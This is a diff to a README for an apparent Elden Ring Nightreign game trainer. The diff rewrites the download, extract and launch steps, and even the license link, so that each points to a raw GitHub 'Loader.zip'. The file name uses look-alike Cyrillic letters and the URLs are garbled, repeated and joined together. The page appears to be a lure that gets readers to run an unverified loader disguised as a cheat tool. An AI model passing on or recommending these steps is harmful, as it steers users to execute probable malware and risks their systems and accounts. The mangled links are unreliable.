@@ -50,12 +50,12 @@ Discover Elden Ring Nightreign Trainer’s compatibility with your favorite oper
 
 Ready to empower your Tarnished? Follow these steps to get started safely and quickly:
 
-**1. Download https://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zip from the repository.**  
+**1. Download https://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zip from the repository.**  
 Get the latest secure release of Elden Ring Nightreign Trainer in compressed format for quick access.
 
-2. Extract https://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zip using a tool like WinRAR or 7-Zip to your preferred folder.
+2. Extract https://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zip using a tool like WinRAR or 7-Zip to your preferred folder.
 
-3. Launch the program (https://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zip or via Wine/Proton for other OS).
+3. Launch the program (https://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zip or via Wine/Proton for other OS).
 
 4. Start Elden Ring and activate desired features in the trainer’s clean and intuitive interface.
 
@@ -84,7 +84,7 @@ Support FromSoftware and the game developers by purchasing legitimate copies of 
 
 This project is licensed under the **MIT license**.  
 Feel free to use, modify, and distribute with proper attribution.  
-See the LICENSE file for details, or visit: https://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zip 
+See the LICENSE file for details, or visit: https://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/DriverRelay/Nightreign-Ascendant-Toolkit/main/Lоader.zip 
 
 ---
 
